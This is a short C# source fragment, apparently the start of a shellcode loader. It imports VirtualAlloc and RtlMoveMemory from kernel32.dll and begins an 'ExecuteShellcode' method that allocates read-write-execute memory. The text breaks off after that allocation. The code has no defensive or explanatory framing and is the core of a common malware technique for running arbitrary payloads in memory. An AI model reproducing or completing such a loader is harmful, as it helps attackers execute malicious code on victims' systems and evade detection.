using System;
using System.Runtime.InteropServices;

public class Native
{
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate void EntryPoint();

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = false)]
    public static extern void RtlMoveMemory(IntPtr dest, byte[] src, uint count);

    public static void ExecuteShellcode(byte[] shellcode)
    {
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, 0x3000, 0x40);
